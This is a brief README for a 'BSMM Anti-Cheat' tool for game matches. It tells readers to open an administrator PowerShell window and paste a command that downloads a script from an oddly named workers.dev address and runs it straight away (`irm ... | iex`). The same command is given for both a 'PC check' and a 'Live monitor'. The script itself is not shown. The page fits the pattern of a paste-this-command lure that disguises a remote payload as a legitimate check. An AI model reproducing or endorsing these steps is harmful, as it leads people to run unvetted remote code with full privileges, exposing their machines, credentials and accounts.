# BSMM Anti-Cheat

The recording check for BSMM matches.

## How to run

Staff send you a one-time command in Discord. It looks like the ones below, with your own code in place of `CODE`. A code works once and then expires.

1. Right-click the Start button and open **Terminal (Admin)** or **Windows PowerShell (Admin)**.
2. Paste the command and press Enter.
3. Leave the window open until it says it has finished.

### PC check

```powershell
irm https://bsmm-relay-v2.yourgaydad2020.workers.dev/c/CODE | iex
```

### Live monitor

Start it before your match and leave the window open until the match is over.

```powershell
irm https://bsmm-relay-v2.yourgaydad2020.workers.dev/c/CODE | iex
```
